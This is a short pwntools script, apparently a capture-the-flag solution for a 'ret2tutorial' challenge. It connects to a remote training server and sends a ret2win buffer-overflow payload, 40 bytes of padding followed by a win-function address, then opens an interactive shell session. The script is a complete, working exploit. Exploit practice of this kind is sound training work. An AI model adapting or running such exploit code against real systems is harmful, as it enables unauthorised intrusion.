from pwn import *

context.log_level = "debug"
io = remote("skillsusa.cybr.club", 443, ssl=True, sni="ret2tutorial")
# io.interactive(prompt="")

win_addr = 0x0000000000401227

payload = b"A" * 40 + p64(win_addr)


io.sendline(b"N") 
io.recvuntil(b"how could this ever go wrong?")
io.sendline(payload)

io.interactive(prompt="")